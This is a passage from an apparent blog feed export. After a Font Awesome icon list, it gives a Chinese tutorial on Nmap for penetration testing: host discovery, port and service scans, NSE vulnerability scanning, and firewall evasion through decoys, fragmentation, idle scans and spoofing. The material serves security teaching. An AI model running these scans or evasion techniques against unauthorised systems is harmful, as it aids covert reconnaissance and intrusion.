fa-arrow-circle-o-right"></i><br><code>.fa-arrow-circle-o-right</code></span><br><span><i class="fa fa-arrow-circle-o-up"></i><br><code>.fa-arrow-circle-o-up</code></span><br><span><i class="fa fa-arrow-circle-right"></i><br><code>.fa-arrow-circle-right</code></span><br><span><i class="fa fa-arrow-circle-up"></i><br><code>.fa-arrow-circle-up</code></span><br><span><i class="fa fa-arrow-down"></i><br><code>.fa-arrow-down</code></span><br><span><i class="fa fa-arrow-left"></i><br><code>.fa-arrow-left</code></span><br><span><i class="fa fa-arrow-right"></i><br><code>.fa-arrow-right</code></span><br><span><i class="fa fa-arrow-up"></i><br><code>.fa-arrow-up</code></span><br><span><i class="fa fa-arrows"></i><br><code>.fa-arrows</code></span><br><span><i class="fa fa-arrows-alt"></i><br><code>.fa-arrows-alt</code></span><br><span><i class="fa fa-arrows-h"></i><br><code>.fa-arrows-h</code></span><br><span><i class="fa fa-arrows-v"></i><br><code>.fa-arrows-v</code></span><br><span><i class="fa fa-caret-down"></i><br><code>.fa-caret-down</code></span><br><span><i class="fa fa-caret-left"></i><br><code>.fa-caret-left</code></span><br><span><i class="fa fa-caret-right"></i><br><code>.fa-caret-right</code></span><br><span><i class="fa fa-caret-square-o-down"></i><br><code>.fa-caret-square-o-down</code></span><br><span><i class="fa fa-caret-square-o-left"></i><br><code>.fa-caret-square-o-left</code></span><br><span><i class="fa fa-caret-square-o-right"></i><br><code>.fa-caret-square-o-right</code></span><br><span><i class="fa fa-caret-square-o-up"></i><br><code>.fa-caret-square-o-up</code></span><br><span><i class="fa fa-caret-up"></i><br><code>.fa-caret-up</code></span><br><span><i class="fa fa-chevron-circle-down"></i><br><code>.fa-chevron-circle-down</code></span><br><span><i class="fa fa-chevron-circle-left"></i><br><code>.fa-chevron-circle-left</code></span><br><span><i class="fa fa-chevron-circle-right"></i><br><code>.fa-chevron-circle-right</code></span><br><span><i class="fa fa-chevron-circle-up"></i><br><code>.fa-chevron-circle-up</code></span><br><span><i class="fa fa-chevron-down"></i><br><code>.fa-chevron-down</code></span><br><span><i class="fa fa-chevron-left"></i><br><code>.fa-chevron-left</code></span><br><span><i class="fa fa-chevron-right"></i><br><code>.fa-chevron-right</code></span><br><span><i class="fa fa-chevron-up"></i><br><code>.fa-chevron-up</code></span><br><span><i class="fa fa-exchange"></i><br><code>.fa-exchange</code></span><br><span><i class="fa fa-hand-o-down"></i><br><code>.fa-hand-o-down</code></span><br><span><i class="fa fa-hand-o-left"></i><br><code>.fa-hand-o-left</code></span><br><span><i class="fa fa-hand-o-right"></i><br><code>.fa-hand-o-right</code></span><br><span><i class="fa fa-hand-o-up"></i><br><code>.fa-hand-o-up</code></span><br><span><i class="fa fa-long-arrow-down"></i><br><code>.fa-long-arrow-down</code></span><br><span><i class="fa fa-long-arrow-left"></i><br><code>.fa-long-arrow-left</code></span><br><span><i class="fa fa-long-arrow-right"></i><br><code>.fa-long-arrow-right</code></span><br><span><i class="fa fa-long-arrow-up"></i><br><code>.fa-long-arrow-up</code></span><br><span><i class="fa fa-toggle-down"></i><br><code>.fa-toggle-down</code></span><br><span><i class="fa fa-toggle-left"></i><br><code>.fa-toggle-left</code></span><br><span><i class="fa fa-toggle-right"></i><br><code>.fa-toggle-right</code></span><br><span><i class="fa fa-toggle-up"></i><br><code>.fa-toggle-up</code></span></div><h2 id="Video-Player-Icons"><a href="#Video-Player-Icons" class="headerlink" title="Video Player Icons"></a>Video Player Icons</h2><div class="fa-icons"><span><i class="fa fa-arrows-alt"></i><br><code>.fa-arrows-alt</code></span><br><span><i class="fa fa-backward"></i><br><code>.fa-backward</code></span><br><span><i class="fa fa-compress"></i><br><code>.fa-compress</code></span><br><span><i class="fa fa-eject"></i><br><code>.fa-eject</code></span><br><span><i class="fa fa-expand"></i><br><code>.fa-expand</code></span><br><span><i class="fa fa-fast-backward"></i><br><code>.fa-fast-backward</code></span><br><span><i class="fa fa-fast-forward"></i><br><code>.fa-fast-forward</code></span><br><span><i class="fa fa-forward"></i><br><code>.fa-forward</code></span><br><span><i class="fa fa-pause"></i><br><code>.fa-pause</code></span><br><span><i class="fa fa-play"></i><br><code>.fa-play</code></span><br><span><i class="fa fa-play-circle"></i><br><code>.fa-play-circle</code></span><br><span><i class="fa fa-play-circle-o"></i><br><code>.fa-play-circle-o</code></span><br><span><i class="fa fa-random"></i><br><code>.fa-random</code></span><br><span><i class="fa fa-step-backward"></i><br><code>.fa-step-backward</code></span><br><span><i class="fa fa-step-forward"></i><br><code>.fa-step-forward</code></span><br><span><i class="fa fa-stop"></i><br><code>.fa-stop</code></span><br><span><i class="fa fa-youtube-play"></i><br><code>.fa-youtube-play</code></span></div><h2 id="Brand-Icons"><a href="#Brand-Icons" class="headerlink" title="Brand Icons"></a>Brand Icons</h2><div class="fa-icons"><span><i class="fa fa-500px"></i><br><code>.fa-500px</code></span><br><span><i class="fa fa-adn"></i><br><code>.fa-adn</code></span><br><span><i class="fa fa-amazon"></i><br><code>.fa-amazon</code></span><br><span><i class="fa fa-android"></i><br><code>.fa-android</code></span><br><span><i class="fa fa-angellist"></i><br><code>.fa-angellist</code></span><br><span><i class="fa fa-apple"></i><br><code>.fa-apple</code></span><br><span><i class="fa fa-behance"></i><br><code>.fa-behance</code></span><br><span><i class="fa fa-behance-square"></i><br><code>.fa-behance-square</code></span><br><span><i class="fa fa-bitbucket"></i><br><code>.fa-bitbucket</code></span><br><span><i class="fa fa-bitbucket-square"></i><br><code>.fa-bitbucket-square</code></span><br><span><i class="fa fa-bitcoin"></i><br><code>.fa-bitcoin</code></span><br><span><i class="fa fa-black-tie"></i><br><code>.fa-black-tie</code></span><br><span><i class="fa fa-btc"></i><br><code>.fa-btc</code></span><br><span><i class="fa fa-buysellads"></i><br><code>.fa-buysellads</code></span><br><span><i class="fa fa-cc-amex"></i><br><code>.fa-cc-amex</code></span><br><span><i class="fa fa-cc-diners-club"></i><br><code>.fa-cc-diners-club</code></span><br><span><i class="fa fa-cc-discover"></i><br><code>.fa-cc-discover</code></span><br><span><i class="fa fa-cc-jcb"></i><br><code>.fa-cc-jcb</code></span><br><span><i class="fa fa-cc-mastercard"></i><br><code>.fa-cc-mastercard</code></span><br><span><i class="fa fa-cc-paypal"></i><br><code>.fa-cc-paypal</code></span><br><span><i class="fa fa-cc-stripe"></i><br><code>.fa-cc-stripe</code></span><br><span><i class="fa fa-cc-visa"></i><br><code>.fa-cc-visa</code></span><br><span><i class="fa fa-chrome"></i><br><code>.fa-chrome</code></span><br><span><i class="fa fa-codepen"></i><br><code>.fa-codepen</code></span><br><span><i class="fa fa-connectdevelop"></i><br><code>.fa-connectdevelop</code></span><br><span><i class="fa fa-contao"></i><br><code>.fa-contao</code></span><br><span><i class="fa fa-css3"></i><br><code>.fa-css3</code></span><br><span><i class="fa fa-dashcube"></i><br><code>.fa-dashcube</code></span><br><span><i class="fa fa-delicious"></i><br><code>.fa-delicious</code></span><br><span><i class="fa fa-deviantart"></i><br><code>.fa-deviantart</code></span><br><span><i class="fa fa-digg"></i><br><code>.fa-digg</code></span><br><span><i class="fa fa-dribbble"></i><br><code>.fa-dribbble</code></span><br><span><i class="fa fa-dropbox"></i><br><code>.fa-dropbox</code></span><br><span><i class="fa fa-drupal"></i><br><code>.fa-drupal</code></span><br><span><i class="fa fa-empire"></i><br><code>.fa-empire</code></span><br><span><i class="fa fa-expeditedssl"></i><br><code>.fa-expeditedssl</code></span><br><span><i class="fa fa-facebook"></i><br><code>.fa-facebook</code></span><br><span><i class="fa fa-facebook-f"></i><br><code>.fa-facebook-f</code></span><br><span><i class="fa fa-facebook-official"></i><br><code>.fa-facebook-official</code></span><br><span><i class="fa fa-facebook-square"></i><br><code>.fa-facebook-square</code></span><br><span><i class="fa fa-firefox"></i><br><code>.fa-firefox</code></span><br><span><i class="fa fa-flickr"></i><br><code>.fa-flickr</code></span><br><span><i class="fa fa-fonticons"></i><br><code>.fa-fonticons</code></span><br><span><i class="fa fa-forumbee"></i><br><code>.fa-forumbee</code></span><br><span><i class="fa fa-foursquare"></i><br><code>.fa-foursquare</code></span><br><span><i class="fa fa-ge"></i><br><code>.fa-ge</code></span><br><span><i class="fa fa-get-pocket"></i><br><code>.fa-get-pocket</code></span><br><span><i class="fa fa-gg"></i><br><code>.fa-gg</code></span><br><span><i class="fa fa-gg-circle"></i><br><code>.fa-gg-circle</code></span><br><span><i class="fa fa-git"></i><br><code>.fa-git</code></span><br><span><i class="fa fa-git-square"></i><br><code>.fa-git-square</code></span><br><span><i class="fa fa-github"></i><br><code>.fa-github</code></span><br><span><i class="fa fa-github-alt"></i><br><code>.fa-github-alt</code></span><br><span><i class="fa fa-github-square"></i><br><code>.fa-github-square</code></span><br><span><i class="fa fa-gittip"></i><br><code>.fa-gittip</code></span><br><span><i class="fa fa-google"></i><br><code>.fa-google</code></span><br><span><i class="fa fa-google-plus"></i><br><code>.fa-google-plus</code></span><br><span><i class="fa fa-google-plus-square"></i><br><code>.fa-google-plus-square</code></span><br><span><i class="fa fa-google-wallet"></i><br><code>.fa-google-wallet</code></span><br><span><i class="fa fa-gratipay"></i><br><code>.fa-gratipay</code></span><br><span><i class="fa fa-hacker-news"></i><br><code>.fa-hacker-news</code></span><br><span><i class="fa fa-houzz"></i><br><code>.fa-houzz</code></span><br><span><i class="fa fa-html5"></i><br><code>.fa-html5</code></span><br><span><i class="fa fa-instagram"></i><br><code>.fa-instagram</code></span><br><span><i class="fa fa-internet-explorer"></i><br><code>.fa-internet-explorer</code></span><br><span><i class="fa fa-ioxhost"></i><br><code>.fa-ioxhost</code></span><br><span><i class="fa fa-joomla"></i><br><code>.fa-joomla</code></span><br><span><i class="fa fa-jsfiddle"></i><br><code>.fa-jsfiddle</code></span><br><span><i class="fa fa-lastfm"></i><br><code>.fa-lastfm</code></span><br><span><i class="fa fa-lastfm-square"></i><br><code>.fa-lastfm-square</code></span><br><span><i class="fa fa-leanpub"></i><br><code>.fa-leanpub</code></span><br><span><i class="fa fa-linkedin"></i><br><code>.fa-linkedin</code></span><br><span><i class="fa fa-linkedin-square"></i><br><code>.fa-linkedin-square</code></span><br><span><i class="fa fa-linux"></i><br><code>.fa-linux</code></span><br><span><i class="fa fa-maxcdn"></i><br><code>.fa-maxcdn</code></span><br><span><i class="fa fa-meanpath"></i><br><code>.fa-meanpath</code></span><br><span><i class="fa fa-medium"></i><br><code>.fa-medium</code></span><br><span><i class="fa fa-odnoklassniki"></i><br><code>.fa-odnoklassniki</code></span><br><span><i class="fa fa-odnoklassniki-square"></i><br><code>.fa-odnoklassniki-square</code></span><br><span><i class="fa fa-opencart"></i><br><code>.fa-opencart</code></span><br><span><i class="fa fa-openid"></i><br><code>.fa-openid</code></span><br><span><i class="fa fa-opera"></i><br><code>.fa-opera</code></span><br><span><i class="fa fa-optin-monster"></i><br><code>.fa-optin-monster</code></span><br><span><i class="fa fa-pagelines"></i><br><code>.fa-pagelines</code></span><br><span><i class="fa fa-paypal"></i><br><code>.fa-paypal</code></span><br><span><i class="fa fa-pied-piper"></i><br><code>.fa-pied-piper</code></span><br><span><i class="fa fa-pied-piper-alt"></i><br><code>.fa-pied-piper-alt</code></span><br><span><i class="fa fa-pinterest"></i><br><code>.fa-pinterest</code></span><br><span><i class="fa fa-pinterest-p"></i><br><code>.fa-pinterest-p</code></span><br><span><i class="fa fa-pinterest-square"></i><br><code>.fa-pinterest-square</code></span><br><span><i class="fa fa-qq"></i><br><code>.fa-qq</code></span><br><span><i class="fa fa-ra"></i><br><code>.fa-ra</code></span><br><span><i class="fa fa-rebel"></i><br><code>.fa-rebel</code></span><br><span><i class="fa fa-reddit"></i><br><code>.fa-reddit</code></span><br><span><i class="fa fa-reddit-square"></i><br><code>.fa-reddit-square</code></span><br><span><i class="fa fa-renren"></i><br><code>.fa-renren</code></span><br><span><i class="fa fa-safari"></i><br><code>.fa-safari</code></span><br><span><i class="fa fa-sellsy"></i><br><code>.fa-sellsy</code></span><br><span><i class="fa fa-share-alt"></i><br><code>.fa-share-alt</code></span><br><span><i class="fa fa-share-alt-square"></i><br><code>.fa-share-alt-square</code></span><br><span><i class="fa fa-shirtsinbulk"></i><br><code>.fa-shirtsinbulk</code></span><br><span><i class="fa fa-simplybuilt"></i><br><code>.fa-simplybuilt</code></span><br><span><i class="fa fa-skyatlas"></i><br><code>.fa-skyatlas</code></span><br><span><i class="fa fa-skype"></i><br><code>.fa-skype</code></span><br><span><i class="fa fa-slack"></i><br><code>.fa-slack</code></span><br><span><i class="fa fa-slideshare"></i><br><code>.fa-slideshare</code></span><br><span><i class="fa fa-soundcloud"></i><br><code>.fa-soundcloud</code></span><br><span><i class="fa fa-spotify"></i><br><code>.fa-spotify</code></span><br><span><i class="fa fa-stack-exchange"></i><br><code>.fa-stack-exchange</code></span><br><span><i class="fa fa-stack-overflow"></i><br><code>.fa-stack-overflow</code></span><br><span><i class="fa fa-steam"></i><br><code>.fa-steam</code></span><br><span><i class="fa fa-steam-square"></i><br><code>.fa-steam-square</code></span><br><span><i class="fa fa-stumbleupon"></i><br><code>.fa-stumbleupon</code></span><br><span><i class="fa fa-stumbleupon-circle"></i><br><code>.fa-stumbleupon-circle</code></span><br><span><i class="fa fa-tencent-weibo"></i><br><code>.fa-tencent-weibo</code></span><br><span><i class="fa fa-trello"></i><br><code>.fa-trello</code></span><br><span><i class="fa fa-tripadvisor"></i><br><code>.fa-tripadvisor</code></span><br><span><i class="fa fa-tumblr"></i><br><code>.fa-tumblr</code></span><br><span><i class="fa fa-tumblr-square"></i><br><code>.fa-tumblr-square</code></span><br><span><i class="fa fa-twitch"></i><br><code>.fa-twitch</code></span><br><span><i class="fa fa-twitter"></i><br><code>.fa-twitter</code></span><br><span><i class="fa fa-twitter-square"></i><br><code>.fa-twitter-square</code></span><br><span><i class="fa fa-viacoin"></i><br><code>.fa-viacoin</code></span><br><span><i class="fa fa-vimeo"></i><br><code>.fa-vimeo</code></span><br><span><i class="fa fa-vimeo-square"></i><br><code>.fa-vimeo-square</code></span><br><span><i class="fa fa-vine"></i><br><code>.fa-vine</code></span><br><span><i class="fa fa-vk"></i><br><code>.fa-vk</code></span><br><span><i class="fa fa-wechat"></i><br><code>.fa-wechat</code></span><br><span><i class="fa fa-weibo"></i><br><code>.fa-weibo</code></span><br><span><i class="fa fa-weixin"></i><br><code>.fa-weixin</code></span><br><span><i class="fa fa-whatsapp"></i><br><code>.fa-whatsapp</code></span><br><span><i class="fa fa-wikipedia-w"></i><br><code>.fa-wikipedia-w</code></span><br><span><i class="fa fa-windows"></i><br><code>.fa-windows</code></span><br><span><i class="fa fa-wordpress"></i><br><code>.fa-wordpress</code></span><br><span><i class="fa fa-xing"></i><br><code>.fa-xing</code></span><br><span><i class="fa fa-xing-square"></i><br><code>.fa-xing-square</code></span><br><span><i class="fa fa-y-combinator"></i><br><code>.fa-y-combinator</code></span><br><span><i class="fa fa-y-combinator-square"></i><br><code>.fa-y-combinator-square</code></span><br><span><i class="fa fa-yahoo"></i><br><code>.fa-yahoo</code></span><br><span><i class="fa fa-yc"></i><br><code>.fa-yc</code></span><br><span><i class="fa fa-yc-square"></i><br><code>.fa-yc-square</code></span><br><span><i class="fa fa-yelp"></i><br><code>.fa-yelp</code></span><br><span><i class="fa fa-youtube"></i><br><code>.fa-youtube</code></span><br><span><i class="fa fa-youtube-play"></i><br><code>.fa-youtube-play</code></span><br><span><i class="fa fa-youtube-square"></i><br><code>.fa-youtube-square</code></span></div><h2 id="Medical-Icons"><a href="#Medical-Icons" class="headerlink" title="Medical Icons"></a>Medical Icons</h2><div class="fa-icons"><span><i class="fa fa-ambulance"></i><br><code>.fa-ambulance</code></span><br><span><i class="fa fa-h-square"></i><br><code>.fa-h-square</code></span><br><span><i class="fa fa-heart"></i><br><code>.fa-heart</code></span><br><span><i class="fa fa-heart-o"></i><br><code>.fa-heart-o</code></span><br><span><i class="fa fa-heartbeat"></i><br><code>.fa-heartbeat</code></span><br><span><i class="fa fa-hospital-o"></i><br><code>.fa-hospital-o</code></span><br><span><i class="fa fa-medkit"></i><br><code>.fa-medkit</code></span><br><span><i class="fa fa-plus-square"></i><br><code>.fa-plus-square</code></span><br><span><i class="fa fa-stethoscope"></i><br><code>.fa-stethoscope</code></span><br><span><i class="fa fa-user-md"></i><br><code>.fa-user-md</code></span><br><span><i class="fa fa-wheelchair"></i><br><code>.fa-wheelchair</code></span><p><br></p></div><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> Fonts </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透工具用法（三）：Nmap 的用法]]></title>
      <url>/2016/09/usage-of-nmap/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>此系列笔记是网络渗透工具的使用方法，本篇是介绍端口扫描工具 Nmap 的使用方法。Nmap 在渗透测试中经常用到，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描各个计算机的操作系统、开放端口、服务，还有可能获得用户的证书。熟练掌握 Nmap 的用法，可以极大的提高渗透测试技术<a id="more"></a></p><h1 id="Nmap-环境"><a href="#Nmap-环境" class="headerlink" title="Nmap 环境"></a>Nmap 环境</h1><blockquote><p><code>kali Liunx</code> 里已经集成了 Namp 环境，所以就不在 <code>Windows</code> 下进行了。</p></blockquote><h1 id="Nmap-命令结构"><a href="#Nmap-命令结构" class="headerlink" title="Nmap 命令结构"></a>Nmap 命令结构</h1><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -[option] [IP or domain] -oN [fileName.txt]
</code></pre><h1 id="Nmap-使用解释"><a href="#Nmap-使用解释" class="headerlink" title="Nmap 使用解释"></a>Nmap 使用解释</h1><h2 id="识别系统"><a href="#识别系统" class="headerlink" title="识别系统"></a>识别系统</h2><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -O -Pn [IP or domain]
</code></pre><blockquote><p>使用 <code>-O</code> 选项，可以获取到被扫描的主机的系统。 <code>-Pn</code> 选项禁用 Nmap 网络发现功能，假定所有系统都是活动的</p></blockquote><h2 id="Timing-模板"><a href="#Timing-模板" class="headerlink" title="Timing 模板"></a>Timing 模板</h2><p><code>timing</code> 参数可以指定 nmap 扫描的速度。其中各个选项如下：</p><ul><li><strong>T0</strong> =&gt; paranoid 慢速网络扫描，串行扫描，两次扫描间隔 <code>5 分钟</code>。扫描速度极慢。</li><li><strong>T1</strong> =&gt; Sneky 慢速网络扫描，串行扫描，两次扫描间隔 <code>15 秒</code>，扫描速度较慢。</li><li><strong>T2</strong> =&gt; Polite 中速网络扫描，串行扫描，两次扫描间隔 <code>400 毫秒</code>，扫描速度慢。</li><li><strong>T3</strong> =&gt; Normal 中速网络扫描，并行扫描，两次扫描间隔 <code>0 秒</code>，扫描速度正常。</li><li><strong>T4</strong> =&gt; Aggressive 快速网络扫描，并行扫描，两次扫描间隔 <code>0 秒</code>，扫描速度较快。</li><li><strong>T5</strong> =&gt; Normal 快速网络扫描，并行扫描，两次扫描间隔 <code>0 秒</code>，扫描速度极快。</li></ul><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -T[0-5] [IP or domain]
</code></pre><h2 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式</h2><h3 id="TCP-扫描"><a href="#TCP-扫描" class="headerlink" title="TCP 扫描"></a>TCP 扫描</h3><p>端口扫描中最稳定的，利用的是 TCP 三次握手。TCP 扫描通常用于收集有关目标的更多信息，但是会和目标主机建立一个完成的 TCP 连接。</p><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -sT -Pn [IP or domain]
</code></pre><blockquote><p><code>-sT</code> TCP 连接扫描（<code>s</code> ==&gt; 哪种类型扫描；<code>T</code> ==&gt; TCP 类型）</p></blockquote><h3 id="SYN-扫描"><a href="#SYN-扫描" class="headerlink" title="SYN 扫描"></a>SYN 扫描</h3><p>TCP 两次握手（隐藏扫描，速度快，nmap 缺省参数）</p><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -sS -Pn [IP or domain]
</code></pre><blockquote><p><code>-sS</code> SYN 连接扫描（<code>s</code> ==&gt; 哪种类型扫描；<code>S</code> ==&gt; SYN 类型）</p></blockquote><h3 id="ACK-扫描"><a href="#ACK-扫描" class="headerlink" title="ACK 扫描"></a>ACK 扫描</h3><p>ACK 扫描，用于确定 TCP 端口是否被防火墙过滤。</p><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -sA -Pn [IP or domain]
</code></pre><blockquote><p><code>-sA</code> ACK 连接扫描（<code>s</code> ==&gt; 哪种类型扫描；<code>A</code> ==&gt; ACK 类型）</p></blockquote><h3 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><p>DHCP，DNS，SNMP，TFTP 等都使用了 UDP 协议；UDP 扫描会评估目标系统上的 UDP 端口，可以确认 UDP 端口是开放还是被防火墙过滤。</p><p><code>Scanning Format:</code></p><pre><code class="bash">nmap -sU -Pn [IP or domain]
</code></pre><blockquote><p><code>-sU</code> UDP 连接扫描（<code>s</code> ==&gt; 哪种类型扫描；<code>U</code> ==&gt; UDP 类型）<br><br><code>-sV</code> UDP 扫描中添加版本扫描信息（<code>V</code> ==&gt; 版本信息）<br><br>不存在 <code>-Pn</code> 参数（从 UDP 协议去理解，你发了就 ok 管他收没收到）</p></blockquote><h2 id="扫描-IP-段"><a href="#扫描-IP-段" class="headerlink" title="扫描 IP 段"></a>扫描 IP 段</h2><p><code>For Example:</code></p><pre><code class="bash">nmap 192.168.1.1-255    # 扫描 192.168.1.1－192.168.1.255 所有 IP
nmap 192.168.1.1/24     # 扫描 192.168.1.1－192.168.1.255 所有 IP
nmap -iL IPL.txt        # 扫描 IPL.txt 中保存的所有 IP
</code></pre><h2 id="输出保存选项"><a href="#输出保存选项" class="headerlink" title="输出保存选项"></a>输出保存选项</h2><ul><li><strong>-oN</strong> =&gt; 保存为文本文件</li><li><strong>-oX</strong> =&gt; 保存为 XML 文件</li><li><strong>-oG</strong> =&gt; 保存为 GREPable 输出</li><li><strong>-oS</strong> =&gt; 脚本输出</li></ul><h1 id="其他更详细的扫描"><a href="#其他更详细的扫描" class="headerlink" title="其他更详细的扫描"></a>其他更详细的扫描</h1><h2 id="Nmap-扫描策略"><a href="#Nmap-扫描策略" class="headerlink" title="Nmap 扫描策略"></a>Nmap 扫描策略</h2><pre><code class="bash"># 适用所有大小网络最好的 nmap 扫描策略

# 主机发现，生成存活主机列表
nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &#39; &#39; &gt; LiveHosts.txt

# 端口发现，发现大部分常用端口
# //nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt

# 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢
nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# 显示 TCP\UDP 端口
grep &quot;open&quot; FullTCP|cut -f 1 -d &#39; &#39; | sort -nu | cut -f 1 -d &#39;/&#39; |xargs | sed &#39;s/ /,/g&#39;|awk &#39;{print &quot;T:&quot;$0}&#39;
grep &quot;open&quot; FullUDP|cut -f 1 -d &#39; &#39; | sort -nu | cut -f 1 -d &#39;/&#39; |xargs | sed &#39;s/ /,/g&#39;|awk &#39;{print &quot;U:&quot;$0}&#39;

# 侦测服务版本
nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

# 扫做系统扫描
nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt

# 系统和服务检测
nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt

# 扫描 B 段的存活主机
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 172.16.0.0/16 | grep -v down | grep &quot;172.16.&quot;
</code></pre><h2 id="Nmap-躲避防火墙"><a href="#Nmap-躲避防火墙" class="headerlink" title="Nmap 躲避防火墙"></a>Nmap 躲避防火墙</h2><pre><code class="bash"># 分段
nmap -f

# 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)
nmap --mtu 24

# 生成随机数量的欺骗
nmap -D RND:10 [target]

# 手动指定欺骗使用的 IP
nmap -D decoy1,decoy2,decoy3 etc.

# 僵尸网络扫描, 首先需要找到僵尸网络的IP
nmap -sI [Zombie IP] [Target IP]

# 指定源端口号
nmap --source-port 80 IP

# 在每个扫描数据包后追加随机数量的数据
nmap --data-length 25 IP

# MAC 地址欺骗，可以生成不同主机的 MAC 地址
nmap --spoof-mac Dell/Apple/3Com IP
</code></pre><h2 id="Nmap-进行-Web-漏洞扫描"><a href="#Nmap-进行-Web-漏洞扫描" class="headerlink" title="Nmap 进行 Web 漏洞扫描"></a>Nmap 进行 Web 漏洞扫描</h2><pre><code class="bash">cd /usr/share/nmap/scripts/
wget //www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
</code></pre><h2 id="Nmap-端口扫描"><a href="#Nmap-端口扫描" class="headerlink" title="Nmap 端口扫描"></a>Nmap 端口扫描</h2><pre><code class="bash"># 使用诱饵隐蔽扫描 nmap -D RND:10 [target] (生成随机数量的诱饵)
# fargement
# data packed – like orginal one not scan packet
# 使用 auxiliary/scanner/ip/ipidseq 来在僵尸网络中查找IP并使用这些IP进行扫描 — nmap -sI ip target
# nmap –source-port 53 target

nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target (随机使用不同的IP进行扫描)
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target (使用 NSE 脚本)
nmap -sU -P0 -T Aggressive -p123 target (攻击式扫描 T1-T5)
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target (版本检测)
nmap -sU -v target (Udp)
nmap -sU -P0 (Udp)
nmap -sC 192.168.31.10-12 (全部使用默认配置)
</code></pre><h1 id="示例扫描"><a href="#示例扫描" class="headerlink" title="示例扫描"></a>示例扫描</h1><h2 id="示例一：SYN-扫描"><a href="#示例一：SYN-扫描" class="headerlink" title="示例一：SYN 扫描"></a>示例一：SYN 扫描</h2><p><code>For Example:</code></p><pre><code class="bash">nmap -sS -T5 192.168.199.133
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-1.png" alt="Namp"></p><h2 id="示例二：基础信息扫描"><a href="#示例二：基础信息扫描" class="headerlink" title="示例二：基础信息扫描"></a>示例二：基础信息扫描</h2><p><code>For Example:</code></p><pre><code class="bash">nmap -O 192.168.199.133
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-2.png" alt="Namp"></p><h2 id="示例三：详细信息扫描"><a href="#示例三：详细信息扫描" class="headerlink" title="示例三：详细信息扫描"></a>示例三：详细信息扫描</h2><p><code>For Example:</code></p><pre><code class="bash">nmap -A 192.168.199.133
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-3.png" alt="Namp"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-4.png" alt="Namp"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-5.png" alt="Namp"></p><h2 id="示例四：网段扫描"><a href="#示例四：网段扫描" class="headerlink" title="示例四：网段扫描"></a>示例四：网段扫描</h2><p><code>For Example:</code></p><pre><code class="bash">nmap -T5 192.168.1.103-110
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-6.png" alt="Namp"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-nmap-7.png" alt="Namp"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> Protocol </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透工具用法（一）：SQLmap 的用法]]></title>
      <url>/2016/09/usage-of-sqlmap/</url>
